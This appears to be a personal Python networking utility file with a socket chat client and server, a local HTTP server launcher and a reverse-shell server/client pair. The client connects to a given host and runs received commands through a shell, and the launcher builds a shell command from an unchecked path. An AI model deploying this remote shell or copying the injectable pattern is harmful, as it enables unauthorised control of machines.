class NetworkingDB:
    def tobinary(ip_address):
        val = ip_address.split(".")
        val = ListDB.listMap(lambda x: str(bin(int(x))[2:]),  val)
        val = ListDB.listMap(lambda x: "0"* (8 - len(x)) + x, val)
        return ".".join(val)

    def chat_client():
        import socket
        import select
        import errno
        HEADER_LENGTH = 10
        IP = "127.0.0.1"
        PORT = 1234
        my_username = input("Username: ")
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((IP, PORT))
        client_socket.setblocking(False)
        username = my_username.encode('utf-8')
        username_header = f"{len(username):<{HEADER_LENGTH}}".encode('utf-8')
        client_socket.send(username_header + username)
        while True:
            message = input(f'{my_username} > ')
            if message:
                message = message.encode('utf-8')
                message_header = f"{len(message):<{HEADER_LENGTH}}".encode('utf-8')
                client_socket.send(message_header + message)
            try:
                while True:
                    username_header = client_socket.recv(HEADER_LENGTH)
                    if not len(username_header):
                        print('Connection closed by the server')
                        sys.exit()
                    username_length = int(username_header.decode('utf-8').strip())
                    username = client_socket.recv(username_length).decode('utf-8')
                    message_header = client_socket.recv(HEADER_LENGTH)
                    message_length = int(message_header.decode('utf-8').strip())
                    message = client_socket.recv(message_length).decode('utf-8')
                    print(f'{username} > {message}')
            except IOError as e:
                if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
                    print('Reading error: {}'.format(str(e)))
                    sys.exit()
                continue
            except Exception as e:
                print('Reading error: '.format(str(e)))
                sys.exit()

    def chat_server():
        import socket
        import select
        HEADER_LENGTH = 10
        IP = "127.0.0.1"
        PORT = 1234
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((IP, PORT))
        server_socket.listen()
        sockets_list = [server_socket]
        clients = {}
        print(f'Listening for connections on {IP}:{PORT}...')
        def receive_message(client_socket):
            try:
                message_header = client_socket.recv(HEADER_LENGTH)
                if not len(message_header):
                    return False
                message_length = int(message_header.decode('utf-8').strip())
                return {'header': message_header, 'data': client_socket.recv(message_length)}
            except:
                return False
        while True:
            read_sockets, _, exception_sockets = select.select(sockets_list, [], sockets_list)
            for notified_socket in read_sockets:
                if notified_socket == server_socket:
                    client_socket, client_address = server_socket.accept()
                    user = receive_message(client_socket)
                    if user is False:
                        continue
                    sockets_list.append(client_socket)
                    clients[client_socket] = user
                    print('Accepted new connection from {}:{}, username: {}'.format(*client_address, user['data'].decode('utf-8')))
                else:
                    message = receive_message(notified_socket)
                    if message is False:
                        print('Closed connection from: {}'.format(clients[notified_socket]['data'].decode('utf-8')))
                        sockets_list.remove(notified_socket)
                        del clients[notified_socket]
                        continue
                    user = clients[notified_socket]
                    print(f'Received message from {user["data"].decode("utf-8")}: {message["data"].decode("utf-8")}')
                    for client_socket in clients:
                        if client_socket != notified_socket:
                            client_socket.send(user['header'] + user['data'] + message['header'] + message['data'])
            for notified_socket in exception_sockets:
                sockets_list.remove(notified_socket)
                del clients[notified_socket]
    
    def startAPythonServer(path = "", port = 8000, ip = "127.0.0.1"):
        import tempfile
        import subprocess
        with tempfile.NamedTemporaryFile(suffix='.command') as f:
            k = f'python -m http.server {port} --bind {ip} --directory "{path}"'
            subprocess.call(f'start /wait {k}', shell=True)


    def reverseConnectionServer():
        import socket
        import sys

        def create_socket():
            try:
                host = ""
                port = 9999
                s = socket.socket()
            except socket.error as msg:
                print("Socket creation error: " + str(msg))
            return host, port , s

        def bind_socket(host, port, s):
            try:
                print("Binding socket to port: " + str(port))
                s.bind((host, port))
                s.listen(5)
            except socket.error as msg:
                print(f"Socket binding error: {str(msg)}\nRetrying")

        def accept_socket(s):
            conn, address = s.accept()
            print(f"Connection has been established | IP {address[0]} | Port {address[1]}")
            send_commands(conn, s)
            conn.close()

        def send_commands(conn, s):
            while True:
                cmd = input(">")
                if cmd == 'quit':
                    conn.close()
                    s.close()
                    sys.exit()
                val = str.encode(cmd)
                if (len(val) > 0):
                    conn.send(val)
                    client_response = str(conn.recv(1024), "utf-8")
                    print(client_response, end="")

        try:
            host, port, s = create_socket()
            bind_socket(host, port, s)
            accept_socket(s)
        except:
            s.close()

    def reverseConnectionClient(ipaddress):   
        import os
        import socket
        import subprocess

        s = socket.socket()
        host = ipaddress
        port = 9999
        s.connect((host, port))

        while True:
            data = s.recv(1024)
            if(data[:2].decode('utf-8') == "cd"):
                os.chdir(data[3:].decode("utf-8"))

            if(len(data) > 0):
                cmd = subprocess.Popen(data.decode('utf-8'), shell = True, stdout= subprocess.PIPE, 
                                    stderr= subprocess.PIPE, stdin= subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = output_bytes.decode("utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + ">") )
        s.close()
        
class Network:
    def readingBookRef():
        pass